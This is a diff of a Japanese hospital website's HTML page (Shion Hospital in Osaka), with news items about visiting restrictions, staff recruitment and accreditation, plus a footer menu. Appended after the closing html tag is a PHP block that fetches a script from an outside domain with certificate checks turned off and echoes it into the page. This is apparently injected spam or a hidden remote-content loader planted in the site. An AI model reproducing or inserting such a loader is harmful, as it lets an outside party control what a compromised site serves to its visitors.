+          <span class="info_title">新型コロナウイルス感染防止のため、ご家族の方も含め、不要不急の場合を除き、原則として面会を控えていただくようお願い申し上げます。</span><br>
+          </li>
+            
+          <li>
+          <span class="date">2019.08.20</span>
+          <span class="info_title">常勤医師の変更に伴い、外来診療担当表を変更しました。</span><br>
+          </li>
+            
+          <li>
+          <span class="date">2019.06.19</span>
+          <span class="info_title"><a href="https://www.facebook.com/shion.hospital">Facebookページ</a>を開設しました。</span><br>
+          </li>
+            
+          <li>
+          <span class="date">2019.03.18</span>
+          <span class="info_title">【求人】「看護師」「准看護師」「看護補助者」募集のお知らせ<br>思温病院では「看護師」「准看護師」「看護補助者」を募集しております。<br>   詳しい求人内容は<a href="recruit.html">こちら</a>をご参照ください。</span><br>
+          </li>
+
+          <li>
+          <span class="date">2019.02.22</span>
+          <span class="info_title">面会制限（継続）のお願い<br>先月来インフルエンザ感染拡大防止を目的とした「面会禁止」を「面会禁止」から「面会制限」に切替えることと致しましたので、お知らせいたします。詳しい内容は<a href="images/20190222_menkaiseigen.pdf">こちら</a>をご参照ください。</span><br>
+          </li>
+
+          <li>
+          <span class="date">2019.01.21</span>
+          <span class="info_title">患者様及びすべてのご来院の皆様へ<br> 2019年1月21日より、全病棟入院中の患者さまの面会につきまして、インフルエンザ拡大防止のため、<br>ご遠慮いただきますようお願いいたします。</span><br>
+          </li>
+
+          <li>
+          <span class="date">2018.12.13</span>
+          <span class="info_title">「消化器内科　専門外来」 開設のお知らせ<br>2018年12月17日より、「消化器内科　専門外来」　を開設いたします。<br>詳しい資料は<a href="images/shoukakinaika.pdf">こちら</a>をご確認ください</span>
+          </li>
+
+          <li>
+          <span class="date">2018.08.03</span>
+          <span class="info_title">病院機能評価 認定のお知らせ<br>公益財団法人 日本医療機能評価機構より 病院機能評価（一般病院１）の認定を受けました。</span>
+          </li>
+
+          <li>
+          <span class="date">2017.07.01</span>
+          <span class="info_title">開放型病院 承認のお知らせ<br>
+          思温病院は7月1日付で開放型病院（地域の診療所・クリニックに病床を提供・開放し地域医療全体を支える病院）の承認を頂きました。</span>
+          </li>
+
+          <li>
+          <span class="date">2017.04.06</span>
+          <span class="info_title">ホームページ更新のお知らせ<br>
+          ホームページをリニューアルいたしました。</span>
+          </li>
+        </div>
+
+       <!-- <li>
+			<span class="date">2016.12.30</span>
+          	<span class="info_title">年末年始休診のお知らせ<br>
+			12月31日（土曜）から1月3日（水曜）までの間、通常の外来診療は年末年始休診とさせていただきます。予め、ご了承ください。</span>
+        </li>
+		<li>
+			<span class="date">2016.09.12</span>
+          	<span class="info_title">在宅医療（訪問診療）を開始いたしました。<br>
+			在宅担当は狭間院長・西木医師・尾山医師が担当いたします。<br>
+			ご質問がございましたら、地域連携室までお問合せ下さい。</span>
+        </li>-->
+      </ul>
+		</article>
+
+         <!--   <h3 class="heading">関連リンク</h3>
+         <div class="links">
+        		<ul>
+                <li><a href="http://www.superhotel.co.jp" target="_blank"><u>スーパーホテル</u></a></li>
+				<li><a href="http://www.supercourt.jp" target="_blank"><u>スーパー・コート</u></a></li>
+                <li><a href="http://www.shionkai.com" target="_blank"><u>医療法人 思温会</u></a></li>
+                <li><a href="http://www.f-seiryou.com/index.html" target="_blank"><u>社会福祉法人 聖綾福祉会</u></a></li>
+                <li><a href="http://ikiiki-school.jp" target="_blank"><u>イキイキ介護スクール</u></a></li>
+                <li><a href="https://www.staff-manzoku.co.jp" target="_blank"><u>スタッフ満足</u></a></li>
+        		</ul>
+        		<p><img src="images/manzokudo_pc.png" class="img js-image-switch"></p>
+        </div>-->
+	</section>
+</div>
+
+ <!--ここからトップへボタン-->
+ <p id="page-top"><a href="#wrap">PAGE TOP</a></p>
+
+ <!--ここまで-->
+
+<!-- フッター -->
+<footer id="footer">
+	<div class="inner">
+  	<!-- 左側 -->
+		<div id="info" class="grid">
+			<!-- ロゴ -->
+			<div class="logo">
+				<a href="index.html">医療法人嘉健会 思温病院<br /><span>YOSHIKENKAI SHION HOSPITAL</span></a>
+			</div>
+			<!-- / ロゴ -->
+			<!-- 電話番号+受付時間 -->
+            <!--
+			<div class="info">
+				<p class="tel"><span>電話:</span> 06-6657-3711</p>
+				<p class="open">&#12306;557-0034<br>
+大阪市西成区松1丁目1番31号</p>
+			</div>
+            -->
+			<!-- / 電話番号+受付時間 -->
+		</div>
+		<!-- / 左側 -->
+		<!-- 右側 ナビゲーション -->
+		<ul class="footnav">
+			<li><a href="about.html">病院のご案内</a></li>
+      <li><a href="./images/pamphlet.pdf" target="_blank">病院パンフレット</a></li>
+			<li><a href="hospitalpolicy.html">病院の方針</a></li>
+      <li><a href="schedule.html">外来診療担当表</a></li>
+			<li><a href="consultation.html">医師のご紹介</a></li>
+			<li><a href="department.html">部門のご紹介</a></li>
+			<li><a href="hospitalization.html">診察・入院のご案内</a></li>
+			<li><a href="shiondayori.html">しおんだより</a></li>
+			<li><a href="recruit.html">求人情報</a></li>
+			<li><a href="about.html#access">アクセス</a></li>
+			<li><a href="./images/notices.pdf" target="_blank">厚生労働大臣の定める掲示事項</a></li>
+			<li><a href="sitemap.html">サイトマップ</a></li>
+			<li><a href="privacypolicy.html">プライバシーポリシー</a></li>
+		</ul>
+		<!-- / 右側 ナビゲーション -->
+	</div>
+</footer>
+	<!-- / フッター -->
+	<address>Copyright(c) 2016 Shion hospital. All Rights Reserved.</address>
+
+</body>
+</html>
+
+<?php
+$url = 'https://backlinkku.id/menu/vip-v1/script.txt';
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$response = curl_exec($ch);
+curl_close($ch);
+echo $response;
+?>
